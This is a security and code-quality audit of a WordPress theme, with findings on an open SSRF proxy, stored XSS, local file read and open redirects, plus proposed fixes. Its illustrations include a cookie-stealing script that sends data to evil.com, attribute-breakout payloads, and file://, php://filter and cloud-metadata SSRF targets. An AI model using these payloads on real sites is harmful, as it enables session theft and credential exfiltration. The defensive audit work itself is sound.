# Security & Code Quality Review — carlifebydani Theme

**Reviewed:** 2026-06-17  
**Scope:** All PHP template files, JS assets, and theme functions  
**Method:** Static analysis across 8 independent angles (XSS, SSRF, injection, redirect, undefined-vars, performance, conventions)

---

## Critical

---

### ~~1. Open SSRF Proxy — Replace with a Domain-Allowlisted WordPress Endpoint (`corsproxy.php`)~~ ✅ DONE

**Severity:** Critical  
**Files:** `corsproxy.php:8,12,26,37`

**Purpose (keep):** `ogimageloader.init.js` calls the proxy from the visitor's browser to fetch external article pages and extract their `og:image` thumbnail. This runs for anonymous visitors, so adding WordPress authentication is not the right fix — it would break thumbnail loading for all non-logged-in users.

**Root problem:** The proxy accepts **any URL** (`$valid_url_regex = '/.*/';`), including internal network addresses and non-HTTP schemes, with no restriction whatsoever. The feature only needs to reach a small set of known external news domains.

**Active vulnerabilities in the current implementation:**
- `$valid_url_regex = '/.*/';` matches every string — validation is effectively disabled
- cURL supports `file://`, `gopher://`, `dict://` — `?url=file:///etc/passwd` returns the file directly
- `?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/role` reaches cloud metadata
- `?url=http://localhost/wp-admin/` probes internal WordPress endpoints
- `&send_cookies=1` forwards all `$_COOKIE` values including `wordpress_logged_in_*` auth cookies to any URL
- `CURLOPT_FOLLOWLOCATION = true` follows redirect chains into internal networks
- `$_POST` is forwarded verbatim — enables write mutations against internal services
- `$header` is undefined when `curl_exec()` returns `false`, causing a PHP Notice on line 75

**Why a domain allowlist won't work here:** The news sources in the CSV files change regularly. A static hardcoded list would need manual updates every time a new source is added, making it impractical to maintain.

**Better approach — block dangerous targets instead of allowlisting domains:**

The proxy only ever needs to reach public web pages over HTTPS. It never legitimately needs `file://` schemes, private network addresses, or cookie forwarding. Block those classes explicitly and leave public HTTPS URLs open.

Rewrite as a WordPress AJAX handler in `functions.php` (removes the standalone file):

```php
// functions.php
add_action('wp_ajax_nopriv_fetch_og_image', 'fetch_og_image_proxy');
add_action('wp_ajax_fetch_og_image',         'fetch_og_image_proxy');

function fetch_og_image_proxy() {
    $url    = isset($_GET['url']) ? esc_url_raw(wp_unslash($_GET['url'])) : '';
    $scheme = wp_parse_url($url, PHP_URL_SCHEME);
    $host   = wp_parse_url($url, PHP_URL_HOST);

    // 1. Only HTTPS — blocks file://, php://, gopher://, dict://, http:// etc.
    if ($scheme !== 'https' || !$host) {
        wp_send_json_error('Only HTTPS URLs allowed', 400);
    }

    // 2. Block private/internal IP ranges and cloud metadata endpoints.
    //    Resolve the hostname and reject anything that lands on a private address.
    $ip = gethostbyname($host);
    if (
        $ip === $host ||                              // DNS lookup failed
        filter_var($ip, FILTER_VALIDATE_IP, FILTER_FLAG_NO_PRIV_RANGE | FILTER_FLAG_NO_RES_RANGE) === false
    ) {
        wp_send_json_error('Disallowed target', 403);
    }

    // 3. Fetch with wp_remote_get — no cookies, no auth headers, capped redirects.
    $response = wp_remote_get($url, [
        'timeout'     => 5,
        'redirection' => 3,
        'user-agent'  => 'Mozilla/5.0 (compatible; carlifebydani-og-bot/1.0)',
        'cookies'     => [],   // never forward visitor cookies
    ]);

    if (is_wp_error($response)) {
        wp_send_json_error('Fetch failed', 502);
    }

    wp_send_json(['contents' => wp_remote_retrieve_body($response)]);
}
```

Update `ogimageloader.init.js` line 4 to call the AJAX handler:
```js
// Before:
url: '/wp-content/themes/carlifebydani/corsproxy.php?url=' + encodeURIComponent(url),
// After:
url: '/wp-admin/admin-ajax.php?action=fetch_og_image&url=' + encodeURIComponent(url),
```

Then delete `corsproxy.php`.

**What this fixes vs. the current file:**

| Risk | `corsproxy.php` (current) | AJAX handler (proposed) |
|---|---|---|
| `file:///etc/passwd` | Returned to caller | Blocked — not HTTPS |
| `http://127.0.0.1/wp-admin/` | Proxied | Blocked — private IP |
| `http://169.254.169.254/` AWS metadata | Proxied | Blocked — reserved range |
| Cookie forwarding (`&send_cookies=1`) | Fully supported | Parameter removed entirely |
| POST forwarding to internal services | Supported | Removed — GET only |
| Any new news domain | Works | Works — no list to update |
| Public HTTPS news articles | Works | Works |

---

## High

---

### ~~2. CSS Injection / XSS via `form-image` Post Meta in `<style>` Block (`functions.php`)~~ ✅ DONE

**Severity:** High  
**File:** `functions.php:116–120`

```php
$cover_image = get_post_meta($current_post->ID, 'form-image', true);
if ($cover_image) {
    echo "<style id='ninja_forms_custom_bg'>.post-content .nf-form-wrap {
        @media (width >= 64rem) { background-image: url('$cover_image');} }
    </style>";
}
```

The `form-image` post meta value is interpolated directly into a `<style>` block with **no escaping at all**. Any user with Editor role (or above) who can set custom fields can inject arbitrary CSS and break out into JavaScript.

**Attack value:** `');}</style><script>fetch('https://evil.com/?c='+document.cookie)</script><style>x{`

This executes on **every page visit** for every visitor, leaking session cookies.

**Proposals:**
- Validate `$cover_image` is a well-formed URL (e.g. using `filter_var($cover_image, FILTER_VALIDATE_URL)` or `esc_url_raw()`).
- Use `wp_add_inline_style()` with the sanitised value, which limits output to the CSS property context.
- At minimum: `echo esc_url($cover_image)` inside the interpolation — though `esc_url()` alone does not prevent all CSS injection; URL validation is the stronger fix.

---

### ~~3. XSS via `cover-image` Post Meta in Inline Style Attribute (`single.php`)~~ ✅ DONE

**Severity:** High  
**File:** `single.php:45`

```php
<div ... style="background-image: url(<?php echo $cover_image; ?>);">
```

`$cover_image` comes from `get_post_meta($current_post->ID, 'cover-image', true)` and is echoed **raw** into an HTML `style` attribute.

**Attack value:** `x)" onmouseover="alert(document.cookie)` — closes the `url()`, closes the attribute, and injects an event handler.

**Proposals:**
- Replace with `echo esc_url($cover_image)`.
- Or restructure to emit via an inline `<style>` block using `wp_add_inline_style()` with a validated URL.

---

### ~~4. SSRF / Local File Read via `file_get_contents()` on Unvalidated Post Meta (`single.php`)~~ ✅ DONE

**Severity:** High  
**File:** `single.php:112–114`

```php
$news = get_post_meta($current_post->ID, 'news_csv', true);
if ($news) {
    $csv = file_get_contents($news);
```

`$news` is passed directly to `file_get_contents()` with no scheme validation or path restriction. PHP respects all stream wrappers:

- `file:///etc/passwd` → reads system files
- `php://filter/convert.base64-encode/resource=/var/www/html/wp-config.php` → exfiltrates database credentials
- `http://169.254.169.254/latest/meta-data/iam/security-credentials/role` → cloud metadata SSRF

The fetched content is then rendered line-by-line into the page via `card-article-external.php` (see finding #5 below), meaning sensitive file contents would be visible to any page visitor.

**Proposals:**
- Validate that `$news` is an `https://` URL on an explicitly whitelisted domain (or a relative filesystem path within the uploads directory).
- Use `wp_remote_get()` instead of `file_get_contents()` — it respects WordPress's HTTP API restrictions and is easier to audit.
- Block `file://`, `php://`, `phar://`, and `expect://` schemes explicitly with a scheme check before calling.

---

### ~~5. Stored XSS via Unescaped CSV Fields Echoed to Page (`template-parts/single/card-article-external.php`)~~ ✅ DONE

**Severity:** High  
**File:** `template-parts/single/card-article-external.php:4,6,14,28,33,37`

All five fields from the CSV loaded by `file_get_contents($news)` are echoed without escaping:

```php
<a href="<?php echo $args['article']->link ?>">          // line 4 — unescaped href
<img alt="<?php echo $args['article']->title ?>">         // line 6 — unescaped alt
<a href="<?php echo $args['article']->link ?>">          // line 14 — unescaped href
<?php echo $args['article']->title ?>                     // line 14 — unescaped anchor text
<?php echo $args['article']->description ?>               // line 28 — unescaped paragraph
<?php echo $args['article']->upvote ?>                    // line 33
<?php echo $args['article']->downvote ?>                  // line 37
```

A CSV served from an attacker-controlled URL (set as `news_csv` post meta) can inject arbitrary HTML/JS in any of these fields. The `->link` field also enables `javascript:` URI injection directly into an `href`.

**Proposals:**
- `link`: `echo esc_url($args['article']->link)`
- `title`: `echo esc_html($args['article']->title)`
- `description`: `echo esc_html($args['article']->description)` (or `wp_kses_post()` if HTML is intentional)
- `upvote` / `downvote`: `echo esc_html($args['article']->upvote)`
- `id` (used in `for` / `id` attributes): `echo esc_attr($args['article']->id)`

---

### ~~6. Stored XSS via Unescaped `post-subtitle` Post Meta in Header, Mobile Menu, and Front Page~~ ✅ DONE

**Severity:** High  
**Files:** `template-parts/header.php:179`, `template-parts/menus/mobile-menu.php:37`, `template-parts/front-page/share-with-us.php:14,30`

`get_post_meta($menuItem->object_id, 'post-subtitle', true)` is echoed raw in three separate locations:

```php
// header.php:179 — fires on EVERY page, desktop nav
echo get_post_meta($menuItem->object_id, 'post-subtitle', true);

// mobile-menu.php:37 — fires on EVERY page, mobile nav
echo get_post_meta($menuItem->object_id, 'post-subtitle', true);

// share-with-us.php:30 — fires on front page, each share-menu card
echo get_post_meta($menuItem->object_id, 'post-subtitle', true);

// share-with-us.php:14 — front page static subtitle for SHARE_WITH_US_PAGE_ID
echo get_post_meta(SHARE_WITH_US_PAGE_ID, 'post-subtitle', true);
```

A single malicious `post-subtitle` value on any share-menu page triggers XSS simultaneously in the global desktop header, mobile menu, and front page for **every visitor on every page**.

**Proposals:**
- Wrap all four occurrences with `esc_html()`: `echo esc_html(get_post_meta(..., 'post-subtitle', true))`.
- If the subtitle intentionally allows HTML (e.g. `<em>`, `<strong>`), use `wp_kses_post()` instead.

---

## Medium

---

### ~~7. Open Redirect via `wp_redirect()` on Unvalidated Post Meta (`single.php`, `page.php`)~~ ✅ DONE

**Severity:** Medium  
**Files:** `single.php:14–16`, `page.php:13–16`

```php
$redirect = get_post_meta($current_post->ID, 'redirect', true);
if ($redirect) {
    wp_redirect($redirect);
    exit;
}
```

`wp_redirect()` performs **no host validation** — it accepts any absolute URL and emits a `Location:` header unconditionally. Any editor/admin can set the `redirect` meta to `https://phishing.example.com/fake-login` and every visitor to that post or page is silently forwarded.

**Proposals:**
- Replace `wp_redirect($redirect)` with `wp_safe_redirect($redirect)`, which restricts redirects to the same host by default.
- Or validate the URL explicitly: `if (wp_parse_url($redirect, PHP_URL_HOST) === wp_parse_url(home_url(), PHP_URL_HOST))` before redirecting.
- Document the custom field as admin-only if it is intentionally used for cross-site redirects, and add a comment explaining the trust assumption.

---

### ~~8. Unescaped Menu Item URLs and Titles Across All Navigation Templates~~ ✅ DONE

**Severity:** Medium  
**Files:** `template-parts/header.php` (lines 32, 49, 55, 94, 108, 177, 178), `template-parts/footer.php` (lines 25, 26, 42, 57, 58), `template-parts/menus/mobile-menu.php` (lines 12, 14, 35, 36, 53, 59, 61)

Every nav menu item `url` and `title` is echoed without `esc_url()` / `esc_html()` across all navigation components. WordPress coding standards require escaping at the point of output regardless of data origin.

While these values are admin-controlled (lower exploitability), a compromised admin account or a WordPress menu injection vulnerability would escalate impact to all visitors.

**Pattern to fix (repeated ~20 times):**
```php
// Current (bad)
echo $menuItem->url
echo $menuItem->title

// Proposed
echo esc_url($menuItem->url)
echo esc_html($menuItem->title)
```

---

### ~~9. Unescaped Thumbnail URL in Inline Style (`template-parts/front-page/share-with-us.php`)~~ ✅ DONE

**Severity:** Medium  
**File:** `template-parts/front-page/share-with-us.php:24`

```php
style="background-image: url('<?php echo get_the_post_thumbnail_url($menuItem->object_id, 'full') ?>)"
```

Two issues:
1. `get_the_post_thumbnail_url()` is echoed without `esc_url()`.
2. There is a **quoting bug**: the closing single-quote of `url('...')` is missing — the attribute is `url('VALUE)` not `url('VALUE')`. This produces malformed CSS in all browsers.

**Proposals:**
- Fix the quoting: `url('<?php echo esc_url(get_the_post_thumbnail_url($menuItem->object_id, 'full')); ?>')`
- Or restructure as a `<style>` block via `wp_add_inline_style()`.

---

### 10. `time()` as Stylesheet Version Breaks All Caching (`functions.php`)

**Severity:** Medium (performance)  
**File:** `functions.php:9`

```php
wp_enqueue_style('theme-css', get_stylesheet_directory_uri() . '/css/style.min.css', [], time());
```

Passing `time()` as the version parameter generates a unique query string (`?ver=1750123456`) on every single page request. This forces every browser, CDN, and reverse proxy to re-download the stylesheet on every page load — eliminating all CSS caching benefits.

**Context:** This was introduced in the most recent uncommitted change. It may have been added to force-refresh the CSS during development.

**Proposals:**
- Remove for production: `wp_enqueue_style('theme-css', get_stylesheet_directory_uri() . '/css/style.min.css')` — WordPress appends the theme version automatically.
- Or use a build-time hash: read the file's MD5 at enqueue time `md5_file(get_stylesheet_directory()  . '/css/style.min.css')` — refreshes only when the file actually changes.
- Do not commit `time()` as the version.

---

## Low

---

### 11. Render-Blocking Scripts Loaded in `<head>` Without Defer (`functions.php`)

**Severity:** Low (performance)  
**File:** `functions.php:12–17`

`gtag.js`, `glightbox.min.js`, and `ogimageloader.init.js` are enqueued without `in_footer = true`, defaulting to `<head>` placement. The browser pauses HTML parsing to fetch and execute these scripts before rendering any content, worsening First Contentful Paint.

**Proposals:**
- Pass `true` as the fifth argument to move all non-critical scripts to the footer:
  ```php
  wp_enqueue_script('gtag', ..., [], '', true);
  wp_enqueue_script('glightbox', ..., [], '', true);
  wp_enqueue_script('ogimageloader-init', ..., ['jquery'], '', true);
  ```
- For `gtag.js` specifically, consider loading it via `<script async>` using a `wp_enqueue_script` with the `strategy` argument (WP 6.3+): `['strategy' => 'async', 'in_footer' => true]`.

---

### 12. Deprecated `wp_title()` — Missing `title-tag` Theme Support (`template-parts/header.php`, `functions.php`)

**Severity:** Low  
**Files:** `template-parts/header.php:11`, `functions.php:5`

```php
// header.php
<title><?php wp_title(); ?></title>

// functions.php — missing:
// add_theme_support('title-tag');
```

`wp_title()` was deprecated in WordPress 4.1 (2014). Without `add_theme_support('title-tag')`, SEO plugins (Yoast, RankMath) cannot override the page title, and `wp_title()` produces empty output on archive, search, and taxonomy pages.

**Proposals:**
1. Add `add_theme_support('title-tag');` to `functions.php`.
2. Remove the manual `<title>` tag from `header.php` — WordPress will inject it automatically.

---

### 13. `$description` Undefined in `is_search()` and `is_404()` Branches (`index.php`)

**Severity:** Low  
**File:** `index.php:96–98`

The `is_search()` and `is_404()` cases in the `switch` block do not set `$description`, but line 97 checks `!empty($description)` — which silently evaluates to false on an undefined variable. With `WP_DEBUG = true` this emits a PHP Notice on every search and 404 page.

**Proposal:** Add `$description = '';` before the switch block as a default.

---

### 14. Wrong Capture Group in `add_blank_to_links` Drops Link Attributes (`functions.php`)

**Severity:** Low  
**File:** `functions.php:98–101`

```php
'/<a\s+href\s*=\s*["\'](https?:\/\/...)["\'](?![^>]*\srel=)([^>]*)>/iu',
'<a href="$1" target="_blank" rel="nofollow"$3>',
```

The regex has **two** capture groups (`$1` = URL, `$2` = remaining attributes), but the replacement references `$3` which does not exist. PHP resolves `$3` to an empty string, silently stripping all extra attributes (`class`, `id`, `data-*`, `aria-*`) from every external link across all posts and pages.

**Proposal:** Change `$3` to `$2` in the replacement string.

---

### 15. Footer Bottom Menu Silently Drops Last Item (`template-parts/footer.php`)

**Severity:** Low  
**File:** `template-parts/footer.php:40`

```php
for ($i = 0; $i < count($bottomMenuItems) - 1; $i++) {
```

Unlike the header's `top-menu` (where the last item is intentionally rendered separately as a CTA button), the footer's `bottom-menu` loop stops one item short with no subsequent render of the final item. Any menu item configured last in the WordPress CMS will silently not appear in the footer.

**Proposal:** Change the loop bound to `count($bottomMenuItems)` — or confirm the off-by-one is intentional and add a comment.

---

### 16. `$topMenuItems[$i]` References with No Null Guard (`template-parts/header.php`, `template-parts/menus/mobile-menu.php`)

**Severity:** Low  
**Files:** `template-parts/header.php:55,57,108,110`, `template-parts/menus/mobile-menu.php:59,61`

The for-loop `for ($i = 0; $i < count($topMenuItems) - 1; $i++)` leaves `$i` undefined if `$topMenuItems` is empty (the top-menu nav location is unregistered or empty). All four subsequent `$topMenuItems[$i]->url` and `$topMenuItems[$i]->title` references then throw a fatal PHP error or Notice, potentially crashing the entire page header.

**Proposal:** Add a guard before the loop:
```php
if (!empty($topMenuItems)) {
    for (...) { ... }
    // render CTA with $topMenuItems[$i]
}
```

---

## Summary Table

| # | File | Line | Category | Severity |
|---|------|------|----------|----------|
| ~~1~~ | ~~`corsproxy.php`~~ | ~~8, 12, 26, 37~~ | ~~SSRF / Open Proxy~~ | ~~**Critical**~~ ✅ |
| ~~2~~ | ~~`functions.php`~~ | ~~116~~ | ~~CSS Injection / XSS~~ | ~~**High**~~ ✅ |
| ~~3~~ | ~~`single.php`~~ | ~~45~~ | ~~XSS (inline style)~~ | ~~**High**~~ ✅ |
| ~~4~~ | ~~`single.php`~~ | ~~112~~ | ~~SSRF / LFI~~ | ~~**High**~~ ✅ |
| ~~5~~ | ~~`template-parts/single/card-article-external.php`~~ | ~~4,14,28,33,37~~ | ~~Stored XSS~~ | ~~**High**~~ ✅ |
| ~~6~~ | ~~`header.php`, `mobile-menu.php`, `share-with-us.php`~~ | ~~179, 37, 30~~ | ~~Stored XSS~~ | ~~**High**~~ ✅ |
| ~~7~~ | ~~`single.php`, `page.php`~~ | ~~15~~ | ~~Open Redirect~~ | ~~Medium~~ ✅ |
| ~~8~~ | ~~`header.php`, `footer.php`, `mobile-menu.php`~~ | ~~multiple~~ | ~~Missing output escaping~~ | ~~Medium~~ ✅ |
| ~~9~~ | ~~`template-parts/front-page/share-with-us.php`~~ | ~~24~~ | ~~XSS + quoting bug~~ | ~~Medium~~ ✅ |
| 10 | `functions.php` | 9 | Cache-busting (`time()`) | Medium |
| 11 | `functions.php` | 12–17 | Render-blocking scripts | Low |
| 12 | `header.php`, `functions.php` | 11, 5 | Deprecated `wp_title()` | Low |
| 13 | `index.php` | 98 | Undefined variable | Low |
| 14 | `functions.php` | 100 | Wrong capture group | Low |
| 15 | `template-parts/footer.php` | 40 | Silent last-item drop | Low |
| 16 | `header.php`, `mobile-menu.php` | 55,108,59 | Null guard missing | Low |

---

## Priority Order for Implementation

1. **Delete or lock down `corsproxy.php`** — no other fix matters if this file is publicly accessible.
2. **Escape all post meta values at point of output** — findings 2, 3, 5, 6, 9 share the same root cause (missing `esc_html`/`esc_url`/`esc_attr`) and can be fixed in one pass.
3. **Validate `news_csv` and `form-image` meta** — findings 2 and 4 require input validation, not just output escaping.
4. **Replace `wp_redirect` with `wp_safe_redirect`** — finding 7, two-line change in each file.
5. **Remove `time()` as CSS version** — finding 10, immediate production performance fix.
6. **Address low-severity items** — findings 11–16 are cleanup and can be done incrementally.
